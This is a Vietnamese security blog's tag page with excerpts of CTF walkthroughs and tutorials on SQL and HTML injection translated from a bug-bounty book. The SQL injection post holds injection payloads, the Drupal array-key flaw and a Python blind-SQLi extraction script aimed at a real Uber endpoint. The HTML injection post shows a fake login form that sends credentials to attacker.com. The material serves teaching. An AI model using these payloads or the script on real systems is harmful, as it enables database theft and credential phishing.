<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>CyberSecurity | minhtuanact|Blog - Keep a flame in the rain!</title>
<meta name=keywords content><meta name=description content="minhtuanact|Blog description"><meta name=author content="minhtuanact"><link rel=canonical href=https://minhtuanact.github.io/tags/cybersecurity/><meta name=google-site-verification content="minhtuanact"><meta name=yandex-verification content="minhtuanact"><meta name=msvalidate.01 content="minhtuanact"><link crossorigin=anonymous href=/assets/css/stylesheet.cf48d1e68a243b4844d7da600cd447164b9772fedda31b83657517473b563c30.css integrity="sha256-z0jR5ookO0hE19pgDNRHFkuXcv7doxuDZXUXRztWPDA=" rel="preload stylesheet" as=style><link rel=icon href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=icon type=image/png sizes=16x16 href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=icon type=image/png sizes=32x32 href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=apple-touch-icon href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=mask-icon href=https://minhtuanact.github.io/cat-icon-png-3.png><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate type=application/rss+xml href=https://minhtuanact.github.io/tags/cybersecurity/index.xml><link rel=alternate hreflang=en href=https://minhtuanact.github.io/tags/cybersecurity/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://minhtuanact.github.io/tags/cybersecurity/"><meta property="og:site_name" content="minhtuanact|Blog - Keep a flame in the rain!"><meta property="og:title" content="CyberSecurity"><meta property="og:description" content="minhtuanact|Blog description"><meta property="og:locale" content="en"><meta property="og:type" content="website"><meta property="og:image" content="https://minhtuanact.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://minhtuanact.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="CyberSecurity"><meta name=twitter:description content="minhtuanact|Blog description"></head><body class=list id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://minhtuanact.github.io/ accesskey=h title="minhtuanact|Blog (Alt + H)"><img src=https://minhtuanact.github.io/cat-icon-png-3.png alt aria-label=logo height=35>minhtuanact|Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://minhtuanact.github.io/search/ title="search (Alt + /)" accesskey=/><span>search</span></a></li><li><a href=https://minhtuanact.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://minhtuanact.github.io/wedding title=wedding><span>wedding</span></a></li></ul></nav></header><main class=main><header class=page-header><div class=breadcrumbs><a href=https://minhtuanact.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://minhtuanact.github.io/tags/>Tags</a></div><h1>CyberSecurity</h1></header><article class="post-entry tag-entry"><header class=entry-header><h2 class=entry-hint-parent>VulnHub CTF - DC-2 - Cướp 5 flags và cái kết</h2></header><div class=entry-content><p>Mở đầu Tiếp tục là mình đây, sau khi viết xong bài DC-3 Walkthrough - Cuộc phiêu lưu kỳ thú thì mình lại build lên lab nữa cho nhóm thử sức xem sao. Cụ thể là lab DC-2. Bài này có tất cả là 5 cờ, tính cả cờ cuối. Chúng ta phải tìm đủ 5 cờ đó mới hoàn thành bài lab này. Mọi người theo mình nhé. Tấn công Vẫn như các bài khác, đầu tiên mình phải dùng nmap quét tất cả các IP trong dải mạng của mình để tìm ra IP của lab.
...</p></div><footer class=entry-footer><span title='2019-06-17 08:02:36 +0700 +0700'>June 17, 2019</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;minhtuanact</footer><a class=entry-link aria-label="post link to VulnHub CTF - DC-2 - Cướp 5 flags và cái kết" href=https://minhtuanact.github.io/posts/vulnhub-ctf-dc-2-cuop-5-flags-va-cai-ket/></a></article><article class="post-entry tag-entry"><header class=entry-header><h2 class=entry-hint-parent>VulnHub CTF - DC-3 Walkthrough - Cuộc phiêu lưu kỳ thú</h2></header><div class=entry-content><p>Mở đầu Vào một ngày trời k được đẹp cho lắm, nắng khá gắt, captain có ném cho chúng tôi 1 đường link về mấy bài lab trên VulnHub. Và đây là một trong một số bài mà chúng tôi làm được. Các bài kia rồi cũng sẽ có bài viết nhanh thôi :D. Tôi có nhiệm vụ build con máy này lên, cũng không có khó khăn gì lắm. Mở Virtual Box chọn card mạng bridge để cho anh em vào được rồi run nó lên thôi. Link con lab ấy đây, bạn nào muốn nghịch thì vào đây nha DC-3 Tấn công Trong mô tả của lab DC-3 cũng đã nói. Nó sẽ cho ta 1 con web và bắt chúng ta phải chiếm được quyền root và lấy cờ từ đó.
...</p></div><footer class=entry-footer><span title='2019-06-14 10:08:47 +0700 +0700'>June 14, 2019</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;minhtuanact</footer><a class=entry-link aria-label="post link to VulnHub CTF - DC-3 Walkthrough - Cuộc phiêu lưu kỳ thú" href=https://minhtuanact.github.io/posts/vulnhub-ctf-dc-3-walkthrough-cuoc-phieu-luu-ky-thu/></a></article><article class="post-entry tag-entry"><header class=entry-header><h2 class=entry-hint-parent>Phần 9: SQL Injection</h2></header><div class=entry-content><p>Description SQL ( /ˈɛs kjuː ˈɛl/, hoặc /ˈsiːkwəl/; Structured Query Language) hay ngôn ngữ truy vấn mang tính cấu trúc, là một loại ngôn ngữ máy tính phổ biến để tạo, sửa, và lấy dữ liệu từ một hệ quản trị cơ sở dữ liệu quan hệ. SQL Injection hoặc SQLi xảy ra khi có một lỗ hổng database-backed trên trang web cho phép Attacker truy vấn hoặc tấn công database của trang web. Các cuộc tấn công SQLi thường được thưởng cao vì mức độ nguy hiểm của chúng. Attacker có thể lấy toàn bộ dữ liệu trên website của bạn, thậm chí có thể chỉnh sửa chúng, thao túng và thậm chí có thể tự tạo một admin đăng nhập vào cơ sở dữ liệu của bạn. \ SQL Databases Database lưu trữ thông tin trong các bản ghi và các trường có trong một tập hợp các bảng (còn được gọi là các bảng dữ liệu). Các bảng chứa một hoặc nhiều cột, một hàng trong bảng biểu thị một bản ghi trong CSDL (cơ sở dữ liệu). Người dùng dựa vào ngôn ngữ lập trình có tên là SQL để tạo, đọc, cập nhật và xóa các bản ghi trong CSLD. Người dùng gửi các lệnh SQL (còn được gọi là câu lệnh hoặc truy vấn) đến CSDL và giả sử các lệnh được chấp nhận, CSDL sẽ diễn giải các câu lệnh và thực hiện một số hành động. CSDL SQL phổ biến bao gồm có MySQL, Postgresql, MSSQL, … Chúng tôi sẽ sử dụng MySQL cho các mục đích của chương này nhưng các khái niệm chung áp dụng cho tất cả các CSDL SQL. Các câu lệnh SQL được tạo thành từ các từ khóa và hàm. Ví dụ: Câu lệnh sau cho CSDL chọn thông tin từ cột tên trong bảng người dùng, cho các bản ghi trong đó cột ID bằng 1. 1 SELECT name FROM users WHERE id = 1; Nhiều trang web dựa trên CSDL để lưu trữ thông tin và sử dụng thông tin đó để tự động tạo nội dung. Ví dụ trang https://www.leanpub.com/ lưu trữ các đơn đặt hàng trước đó hoặc danh sách các sách điện tử đã mua trong CSDL mà bạn truy cập khi đăng nhập bằng tài khoản của mình. Trình duyệt web của bạn truy vấn CSDL của trang web và tạo HTML dựa trên thông tin được trả về. Hãy cùng xem một ví dụ lý thuyết về máy chủ được code bằng PHP để tạo lệnh MySQL sau khi người dùng truy cập URL https://www.leanpub.com?name=yaworsk 1 2 3 $name = $_GET['name']; $q = "SELECT * FROM users WHERE name = '$name' "; mysql_query($query); Mã sử dụng $_GET[] để truy cập giá trị tên từ các tham số URL được chỉ định giữa các dấu ngoặc và lưu giá trị trong biến $name. Tham số này sau đó được chuyển đến biến $q mà không cần sanitization. Biến $q đại diện cho truy vấn để thực thi và tìm nạp tất cả dữ liệu từ bảng users trong đó cột tên khớp với giá trị trong tham số URL name. Truy vấn được thực hiện bằng cách chuyển biến $q cho hàm PHP mysql_query. Trang web trả lại tên chứa văn bản thông thường, nhưng nếu người dùng nhập 1 input 'OR 1='1 vào tham số URL như https://www.leanpub.com?name=test' OR 1='1, truy vấn sẽ được thực hiện là: 1 $query = "SELECT * FROM users WHERE name = 'test' OR 1='1' "; Truy vấn đã được thay đổi sau khi kiểm tra giá trị và thêm mã SQL OR 1='1 vào cuối truy vấn. Trong trường hợp này, SQLi sửa đổi mệnh đề WHERE để tìm kiếm các bản ghi trong cột tên khớp với phần search hoặc equattion 1='1 sẽ trả về giá trị true. MySQL coi 1 là số nguyên và vì 1 luôn bằng 1, điều kiện đúng và truy vấn sẽ trả về tất cả các bản ghi trong bảng users. Tuy nhiên, việc kiểm tra injection OR 1='1 sẽ hoạt động khi các phần khác của truy vấn được sanitized. Ví dụ, bạn có thể có một query như: 1 2 3 $name = $_GET['name']; $pw = mysql_real_escape_string($_GET['password']); $query = "SELECT * FROM users WHERE name = '$name' AND pw = '$pw' "; Trong trường hợp này, tham số password cũng do người dùng kiểm soát nhưng được sanitized đúng cách bằng cách sử dụng hàm mysql_real_escape_string. Nếu bạn sử dụng payload, hãy kiểm tra OR 1='1 làm name và mật khẩu sẽ là 12345. 1 $query = "SELECT * FROM users WHERE name = 'test' OR 1='1' AND pw = '12345' "; Query này tìm kiếm tất cả các bản ghi có tên là 1='1 và mật khẩu là 12345 (ví dụ ở đây là CSDL được lưu password ở dạng rõ, chưa băm hay mã hóa). Vì kiểm tra password sử dụng toán tử AND, truy vấn này của chúng tôi đã lấy được dữ liệu trả về với name và mật khẩu là 12345. Nhưng bây giờ chúng ta có 1 kiểu tấn công khác, bằng cách thêm ;--, kiểm tra 'OR 1='1;--. Kiểu Injection này thực hiện được 2 điều: dấu chấm phẩy ; kết thúc câu lệnh SQL và dấu -- cho phép comment lại tất cả câu lệnh ở phía sau nó. Có nghĩa là: 1 $query = "SELECT * FROM users WHERE name = 'test' OR 1='1' AND pw = '12345' "; Sau khi chỉnh sửa một chút thì sẽ thành 1 $query = "SELECT * FROM users WHERE name = 'test' OR 1='1';-- AND pw = '12345' "; Vậy câu lệnh SQL mà $q gửi lên được thực thi sẽ chỉ còn 1 $query = "SELECT * FROM users WHERE name = 'test' OR 1='1'; Câu lệnh này sẽ giúp ta lấy được tất cả bản ghi của bảng users. Examples 1. Drupal SQL Injection Drupal là một hệ thống quản lý nội dung phổ biến được sử dụng để xây dựng trang web, rất giống với Wordpress và Joomla. Nó được viết bằng PHP và dựa trên mô-đun. Cộng đồng Drupal khá mạnh và cung cấp miễn phí. Bao gồm thương mại điện tử, tích hợp bên thứ ba, sản xuất nội dung,… Tuy nhiên, mọi cài đặt Drupal đều chứa ucnfg một bộ mô-đu lõi được sử dụng để chạy nền tảng và yêu cầu kết nối với CSDL. Chúng còn được gọi là lõi Drupal. Vào năm 2014, nhóm Drupal Security đã phát hành bản cập nhật lõi Drupal cho thấy tất cả các trang chạy Drupal đều bị tấn công SQL bởi người dùng ẩn danh. Tác động của lỗ hổng cho phép kẻ tấn công chiếm được bất kỳ trang web Drupal nào. Cụ thể hơn, Drupal đã sử dụng Đối tượng dữ liệu PHP (PDO) làm giao diện để truy cập cơ sở dữ liệu. Các nhà phát triển lõi Drupal đã viết mã gọi các hàm PDO đó và mã Drupal sẽ được sử dụng bất cứ khi nào các nhà phát triển khác viết mã để tương tác với cơ sở dữ liệu Drupal. Đây là một thực tiễn phổ biến trong phát triển phần mềm. Lý do cho điều này là để cho phép Drupal được sử dụng với các loại cơ sở dữ liệu khác nhau (MySQL, Postgres, v.v.), loại bỏ sự phức tạp và cung cấp tiêu chuẩn hóa. Bây giờ, điều đó nói rằng, hóa ra, Stefan đã phát hiện ra rằng mã trình bao bọc Drupal đưa ra một giả định không chính xác về dữ liệu mảng được chuyển đến một truy vấn SQL. Đây là mã gốc: 1 2 3 4 foreach ($data as $i => $value) { [...] $new_keys[$key . '_' . $i] = $value; } Bạn có thể phát hiện ra lỗi không (tôi sẽ có thể)? Các nhà phát triển đã đưa ra giả định rằng dữ liệu mảng sẽ luôn chứa các khóa số, như 0, 1, 2, v.v. (giá trị $i) và do đó họ đã tham gia biến $key thành $i và làm cho giá trị đó bằng với giá trị. Đây là một truy vấn thông thường sẽ trông như thế nào từ hàm db_query của Drupal: 1 db_query("SELECT * FROM {users} WHERE name IN (:name)", array(':name'=>array('user1'\,'user2'))); Ở đây hàm db_query lấy một truy vấn CSDL SELECT * FROM {users} where name IN (:name)và một mảng các giá trị để thay thế cho các phần giữ chỗ trong truy vấn. Trong PHP, khi bạn khai báo một mảng là mảng (‘value’, ‘value2’, ‘value3’), nó thực sự tạo ra [0⇒ ‘value’, 1 ⇒ ‘value2’, 2 ⇒ ‘value3’] trong đó mỗi giá trị có thể truy cập bằng khóa số. Trong trường hợp này, biến tên: đã được thay thế bằng các giá trị trong mảng [0 ⇒ ‘user1’, 1⇒ ‘user2’]. Những gì bạn sẽ nhận được từ điều này là: 1 SELECT * FROM userccs WHERE name IN (:name_0, :name_1) Vấn đề phát sinh tiếp sẽ như sau: 1 2 db_query("SELECT * FROM {users} where name IN (:name)", array(':name'=>array('test) -- ' => 'user1','test' => 'user2'))); Trong trường hợp này , :name là một mảng và các khóa của nó là ‘test) -','test'. Khi Drupal nhận được điều này và xử lý mảng để tạo truy vấn, điều cần làm là: 1 SELECT * FROM users WHERE name IN (:name_test) -- , :name_test) Có thể rất khó để thấy được lý do tại sao lại như vậy, hãy thử. Dựa trên foreach, Drupal sẽ lần lượt đi qua từng phần tử trong mảng. Vì vậy, đối với tiêu chí $i = test)- và $value = user1. Bây giờ, $key là (:name) từ truy vấn và kết hợp với $i, chúng ta nhận được name_test)--. Bây giờ, với tất cả những gì đã có. Drupal đang đóng gói các đối tượng PDO của PHP đi lượn lờ =)), vì PDO cho phép nhiều query. Vì vậy, kẻ tấn công có thể vượt qua được mã độc, như truy vấn SQL thực tế để tạo người dùng quản trị cho khóa mảng, được giải thích và thực thi dưới dạng nhiều truy vấn. 2. Yahoo Sports Blind SQL Theo blog của mình, Stefano đã tìm thấy lỗ hổng SQLi nhờ tham số năm trong http://sports.yahoo.com/nfl/draft?year=2010&amp;type=20&amp;round=2. Từ bài đăng của anh ấy, đây là một ví dụ về phản hồi hợp lệ cho Url: Nào, bây giờ chúng ta thêm -- vào sau year=2010 ta được gì. Lý do cho điều này là, -- đóng vai trò là comment trong truy vấn, như tôi đã nêu chi tiết ở trên. Vì vậy, nơi truy vấn ban đầu của Yahoo có thể trông giống như: 1 SELECT * FROM PLAYERS WHERE YEAR = 2010 AND TYPE = 20 AND ROUND = 2; Sau khi thêm -- thì câu truy vấn sẽ trở thành 1 SELECT * FROM PLAYERS WHERE YEAR = 2010; Nhận ra điều này, chúng ta có thể bắt đầu lấy thông tin CSDL từ Yahoo. Ví dụ: Stefano có thể kiểm tra số phiên bản chính của phần mềm CSDL bằng cách sau: Sử dụng hàm IF, chúng ta sẽ được trả về nếu ký tự đầu tiên từ hàm version() là 5. Hàm IF có một điều kiện là sẽ trả về giá trị sau nó nếu điều kiện là đúng và tham số cuối cùng nếu nó sai. Vì vậy, dựa theo hình trên, điều kiện là ký tự đầu tiên trong phiên bản. Do đó, chúng tôi biết phiên bản CSDL không phải là 5 vì không có kết quả nào được trả về. Lý do đây là được coi là một SQLi mù quáng là bởi vì Stefano có thể nhìn thấy kết quả trực tiếp, anh ấy có thể chỉ cần in ra phiên bản CSDL vì Yahoo chỉ trả lại người dùng. Tuy nhiên, bằng cách thao tác truy vấn và so sánh kết quả với kết quả đầu tiên, anh ta đã có thể tiếp tục trích xuất thông tin từ CSDL của Yahoo. 3. Uber Blind SQLi Ngoài các trang web, việc SQL Injection có thể đạt được thông qua các chỗ khác như liên kết email. Vào tháng 7 năm 2016, Orange Tsai đã nhận được một quảng cáo email từ Uber. Anh ấy nhận thấy rằng liên kết hủy đăng ký bao gồm một chuỗi được mã hóa base64 làm tham số URL. Liên kết trông giống như: 1 2 http://sctrack.email.uber.com.cn/track/unsubscribe.do?p=eyJ1c2VyX2lkIjogIjU3NTUiLCAi\ cmVjZWl2ZXIiOiAib3JhbmdlQG15bWFpbCJ9 Decode đoạn eyJ1c2VyX2lkIjogIjU3NTUiLCAi, sử dụng base64 trả về chuỗi JSON{"user_id": "5755", "receiver": "orange@mymail"}. Sau khi có chuỗi giải mã, anh ta thêm and sleep(12)=1 vào tham số URL được mã hóa, đây là một phép injection vô hại được thiết kế để làm cho CSDL mất nhiều thời gian hơn để đáp ứng với hành động hủy đăng ký {"user_id": "5755 and sleep(12)=1", "receiver": "orange@mymail"}. Nếu một trang web dễ bị vulnerrable, việc thực hiện truy vấn sẽ đánh giá sleep(12) và không thực hiện hành động nào trong 12 giây trước khi so sánh dầu ra của lệnh sleep với 1. Trong MySQL, lệnh sleep thường trả về 0, do đó việc so sánh này sẽ thất bại, nhưng điều này không quan trọng vì việc thực thi sẽ mất ít nhất 12 giây. Sau khi Orange mã hóa lại payload đã sửa đổi và chuyển payload đó sang tham số URL, anh ta đã truy cập liên kết hủy đăng ký để xác nhận phản hồi HTTP mất ít nhất 12 giây. Tuy nhiên Orangeddax quyết định rằng anh ta cần thêm bằng chứng cụ thể về SQLi để gửi cho Uber, vì vậy anh ta đã quyết định kết xuất username, hostname, và name of the database bằng cách sử dụng brute force vì nó thể hiện khả năng trích xuất thông tin từ SQLi mà không cần truy cập dữ liệu bí mật. SQL có một hàm called user trả về username và tên máy chủ của CSDL ở dạng &lt;user>@&lt;host>. Bởi vì Orange không thể truy cập đầu ra từ các truy vấn được injecion của mình, anh ta không thể gọi cho người dùng. Thay vào đó, Oarange đã sửa đổi truy vấn của mình để thêm kiểm tra có điều kiện khi truy vấn tra cứu ID người dùng của anh ta. So sánh một ký tự của tên người dùng CSDL và chuỗi tên máy chủ tại một thời điểm bằng cách sử dụng hàm mid. Tương tự như SQLi của Yahoo Sports từ báo cáo lỗi trước đó. Orange đã sử dụng một câu lệnh so sánh để lấy từng ký tự của tên người dùng và chuỗi tên máy chủ. Ví dụ: để tìm tên người dùng và tên máy chủ bằng cách sử dụng câu lệnh so sánh và sức mạnh của brute force, Orange đã lấy ký tự đầu tiên của giá trị được trả về từ người dùng bằng cách sử dụng hàm mid và đem so sánh xem ký tự đó có bằng 'a' không, sau đó đến 'b' rồi 'c',.. Nếu câu lệnh so sánh là đúng, máy chủ sẽ thực thi lệnh hủy đăng ký cho biết rằng ký tự đàu tiên của giá trị trả về của hàm user bằng với ký tự mà nó được so sánh. Mặt khác, nếu sai thì máy chủ sẽ không hủy đăng ký của anh ta. Bằng cách kiểm tra từng ký tự của hàm user. Giá trị trả về bằng phương thức này, Orange cuối cùng sẽ có thể lấy được toàn bộ tên người dùng và tên máy chủ. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 mport json import string import requests from urllib import quote from base64 import b64encode base = string.digits + string.letters + '_-@.' payload = {"user_id": 5755, "receiver": "blog.orange.tw"} for l in range(0, 30): for i in base: payload['user_id'] = "5755 and mid(user(),%d,1)='%c'#"%(l+1, i) new_payload = json.dumps(payload) new_payload = b64encode(new_payload) r = requests.get('http://sctrack.email.uber.com.cn/track/unsubscribe.do?p='+\ quote(new_payload)) if len(r.content)>0: print i, break Đây là một đoạn code viết bằng python giúp Orange lấy được tên người dùng và tên máy chủ. Summary SQLi có thể là một lỗ hổng nguy hiểm cho một trang web. Nếu kẻ tấn công tìm thấy SQLi, chúng có thể có được full quyền cho một trang web. Trong một số trường hợp, SQLi có thể được leo thang bằng cách chèn dữ liệu vào CSDL cho phép quyền quản trị tren trang web, như trong ví dụ về Drupal. Khi tìm kiếm các lỗ hổng SQLi, hãy chú ý đến những nơi mà bạn có thể chuyển các giấu ngoặc đơn hoặc dấu ngược kép không được giải mã cho một truy vấn. Khi bạn tìm thấy một lỗ hổng, các dấu hiệu cho thấy lỗ hổng đó tồn tại có thể là một hint, chẳng hạn như blind injection. Bạn cũng nên tìm những nơi mà bạn có thể truyền dữ liệu đến một trang web theo những cách không mong muốn, chẳng hạn như những nơi bạn có thể thay thế các tham số mảng trong dữ liệu yêu cầu như trong lỗi của Uber.</p></div><footer class=entry-footer><span title='2019-05-30 14:19:51 +0700 +0700'>May 30, 2019</span>&nbsp;·&nbsp;14 min&nbsp;·&nbsp;minhtuanact</footer><a class=entry-link aria-label="post link to Phần 9: SQL Injection" href=https://minhtuanact.github.io/posts/phan-9-sql-injection/></a></article><article class="post-entry tag-entry"><header class=entry-header><h2 class=entry-hint-parent>Phần 5: HTML Injection</h2></header><div class=entry-content><p>Description Hypertext Markup Language (HTML) injection đôi khi cũng hơi ảo ảo =)). Đây thực sự là một cuộc tấn công được thực hiện bởi một website cho phép người dùng inject HTML vào các trang web của mình bằng cái kiểu mà không giống người dùng bình thường nhập dữ liệu. Nói cách khác, HTML Injection được gây ra bởi việc nhận HTML. Thông thường, thông qua một số hình thức nhập, sau đó được hiện thị dưới dạng input form trên trang web. Điều này khác biệt với Javascript, VBScript, …, có thể dẫn đến Cross Site Scripting Attacks. Vì HTML là ngôn ngữ được sử dụng để xác định cấu trúc của một website, nếu Attacker có thể HTML Injection, về cơ bản chúng có thể thay đổi giao diện của trình duyệt và của trang web đó. Đôi khi, điều này có thể dẫn đến thay đổi hoàn toàn giao diện của trang hoặc trong các trường hợp khác, tạo HTML forms để lừa người dùng với hy vọng họ sử dụng form để gửi thông tin nhạy cảm (Có thể được gọi là lừa đảo). Ví dụ: Nếu bạn có thể HTML Injection, bạn có thể thêm thẻ vào trang, yêu cầu người dùng nhập lại tên người dùng và mật khẩu của họ như: 1 2 3 4 5 &lt;form method='POST' action='http://attacker.com/capture.php' id="login-form"> &lt;input type='text' name='username' value=''> &lt;input type='password' name='password' value=''> &lt;input type='submit' value='submit'> &lt;/form> Tuy nhiên, khi gửi form này, thông tin thực sự sẽ được gửi đến http://attacker.com/ thông qua thuộc tính action, nó sẽ gửi thông tin đến trang web của Attacker. Examples 1. Coinbase Comments Description Đối với lỗ hổng này, reporter đã xác định rằng Coinbase đang giải mã các giá trị được mã hóa URI khi render văn bản. Thông thường các kí tự trong URI không được bảo vệ. Khi một ký tự được mã hóa URI, nó được chuyển đổi thành giá trị byte trong bảng mã ASCII và trước dấu %. Vì vậy, / trở thành %2F, & trở thành %26. Bên cạnh đó, ASCII là một loại mã phổ biến nhất trên internet cho đến khi UTF-8 xuất hiện. Chúng ta cùng đến một ví dụ về loại tấn công này nhé. 1 &lt;h1>This is a test&lt;/h1> * Coinbase sẽ hiển thị dưới dạng văn bản thuần túy, chính xác như bạn thấy ở bên trên. Nhưng người dùng gửi đi những ký tự được mã hóa thì sẽ trở thành ```html %3C%68%31%3E%54%68%69%73%20%69%73%20%61%20%74%65%73%74%3C%2F%68%31%3E ``` * Coinbase sẽ giải mã chuỗi đó và hiển thị dưới dạng &lt;h1>This is a test&lt;/h1> * Bạn đọc có thể xem video này để hiểu rõ hơn về kiểu tấn công này. > [HTML Injection in apps user review](https://www.dropbox.com/s/360cytluyiw2ym9/HTMLI.mp4?dl=0) * Khi bạn kiểm tra một trang web, hãy kiểm tra xem nó được xử lý các loại đầu vào khác nhau nào, bao gồm văn bản thuần túy và văn bản được mã hóa. Hãy hết sức cảnh giác với các trang web chấp nhận các giá trị được mã hóa URI và hiển thị được decoded values. Bạn đọc có thể sử dụng công cụ [CyberChef](https://gchq.github.io/CyberChef) để mã hóa và giải mã URI. Tôi nghĩ rằng bạn sẽ rất thích nó đấy ^^. 2. HackerOne Unintended HTML Inclusion Description: Về vấn đề này, chúng ta sẽ cho một ví dụ luôn nhé. 1 [test](http://www.torontowebsitedeveloper.com "test ismap="yes"') Trình soạn thảo HTML sẽ lấy đoạn ở trên và biến thành 1 &lt;a title="test ismap="yes"' href="http://www.torontowebsitedeveloper.com">test&lt;/a> Nói cách khác, code sẽ xem xét đệ quy chuỗi nào nên là chuỗi tiêu đề và sử dụng first single hoặc double quote. Tôi đã có thể đưa 1 loạt HTML vào thẻ &lt;a>. Đây có vẻ là một lỗi khá nghiêm trọng đúng không :D. 3. Within Security Content Spoofing Description: Mặc dù về mặt spoofing nội dung về mặt kỹ thuật là một loại lỗ hổng khác với HTML Injection, tôi đã đưa nó vào đây vì attacker có thể hiển thị nội dung mà attacker muốn chọn. Inside Security được xây dựng trên nền tảng Wordpress bao gồm đường dẫn đăng nhập withinsecurity.com/wp-login.php. Một hacker nhận thấy rằng trong quá trình đăng nhập, nếu xảy ra lỗi thì Inside Security sẽ hiển thị access_denied, cũng tương ứng với tham số lỗi trong URL: 1 https://withinsecurity.com/wp-login.php?error=access_denied Nhận thấy điều này, attacker đã thử sửa đổi tham số lỗi và thấy rằng bất kỳ giá trị nào được nhập vào đều được trang web hiển thị như một phần của thông báo lỗi được thông báo cho người dùng. Dưới đây, ví dụ được sử dụng: 1 https://withinsecurity.com/wp-login.php?error=Your%20account%20has%20%hacked * Kết luận ở đây: Ta thấy tham số trong URL được hiển thị trên trang. Một thử nghiệm đơn giản thay đổi tham số access_denied có thể đã tạo ra một lỗ hổng trong trường hợp này. * Chú ý: Theo dõi các tham số URL đang được thông qua và hiển thị dưới dạng nội dung của trang. Chúng có thể tạo cơ hội cho attacker lừa nạn nhân thực hiện một số hành động nguy hiểm. Đôi khi, điều này dẫn đến các kiểu tấn công Cross Site Scripting hoặc là giả mạo nội dung và HTML Injection. Summary HTML Injection trình bày một lỗ hổng cho các trang web và nhà phát triển vì nó có thể được sử dụng để lừa đảo người dùng và lừa họ gửi thông tin nhạy cảm đến hoặc truy cập các trang web độc hại. Khám phá các loại lỗ hỏng này không phải luôn luôn là gửi HTML đơn giản mà còn phải khám phá cách mà một trang web có thể hiển thị văn bản được nhập của bạn, như các ký tự được mã hóa URI. Và mặc dù không hoàn toàn giống như nội dung HTML, việc giả mạo nội dung cũng tượng tự ở chỗ nó liên quan đến đầu vào được hiển thị lên cho nạn nhân trong trang HTML. Attacker luôn có cơ hội để loại bỏ tham số URL và hiển thị chúng trên trang web. Nguồn: Web Hacking 101, biên tập và dịch lại.
...</p></div><footer class=entry-footer><span title='2019-05-29 10:34:02 +0700 +0700'>May 29, 2019</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;minhtuanact</footer><a class=entry-link aria-label="post link to Phần 5: HTML Injection" href=https://minhtuanact.github.io/posts/phan-5-html-injection/></a></article><article class="post-entry tag-entry"><header class=entry-header><h2 class=entry-hint-parent>Tổng hợp các câu hỏi phỏng vấn pentest - kiến thức chung (P2)</h2></header><div class=entry-content><p>Hỏi: Answer true or false and explain your answer: two-factor authentication protects against session hijacking? Trả lời: Về câu trả lời này, mình vẫn chưa biết nên trả lời là đúng hay sai. Có 2 trường hợp xảy ra ở đây: Trước khi bạn nhập mã xác minh gửi đến điện thoại hay ứng dụng hay đại loại là 1 mã OTP nào đó mà bên Server gửi cho bạn để xác minh đó đúng là bạn đăng nhập vào tài khoản của bạn. Thì khi đó attacker không thể chiến quyền điều khiển phiên được. Nhưng sau khi bạn nhập mã xác minh rồi. Attacker có thể thực hiện việc chiếm quyền điều khiển phiên do bên dịch vụ kia đặt vào bằng XSS hoặc malware. Attacker có thể sử dụng cái Token Cookie đó và đưa vào yêu cầu của họ cho bên kia (ví dụ như Google). Và sau đó attacker đã có quyền truy cập vào tài khoản của bạn. Còn về câu trả lời đúng hay sai thì bạn đọc có thể tự trả lời rồi nhé :D. Hỏi: Explain what happens when a connection from your webbrowser to a webserver is initiated on every OSI layer (as detailed as you like) Trả lời: Chúng ta sẽ cùng phân tích gói tin sẽ đường truyền đi trên mạng Internet như thế nào, cụ thể ở đây là chúng ta đang lướt web, và mô hình sử dụng là OSI (Hướng đi của gói tin sẽ là từ phía máy gửi (client) đến máy nhận (Server))
